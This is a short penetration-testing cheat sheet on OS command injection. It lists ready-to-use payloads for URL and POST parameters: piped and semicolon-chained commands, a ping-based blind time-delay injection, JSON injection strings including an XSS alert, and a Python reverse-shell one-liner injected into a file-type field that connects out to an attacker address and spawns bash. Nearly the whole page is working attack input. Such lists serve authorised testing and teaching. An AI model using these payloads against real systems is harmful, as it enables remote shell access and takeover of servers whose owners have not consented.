---
title: OS Command Injection
desc: 
tags: [Burp, Command, Injection, Linux, OS, Reverse, Shell, Web]
alts: []
render_with_liquid: false
---

## URL Parameters

```
/api/cmd/whoami
/command/whoami

/?cmd=whoami
```

<br />

## POST Parameters

- **Basic**

    ```sh
    productId=1&stockId=1|whoami
    
    file=example.jpg&filetype=png;ping -c 1 <local-ip>
    ```

- **Reverse Shell**

    ```sh
    file=example.jpg&filetype=png;export RHOST="10.0.0.1";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
    ```

- **Blind Command Injection (Time Delay)**

    Using **"ping"** command.

    ```sh
    name=michael&email=michael@example.com||ping+-c+10+127.0.0.1||&message=hello
    ```

- **JSON Injection**

    ```json
    { "username": "\"; pwd \"" }
    {"name":"<script>alert(1)</script>", "email":"victim@vulnerable.com"}
    {"name": "admin", "content": "{{template: ./admin.php}}"}
    ```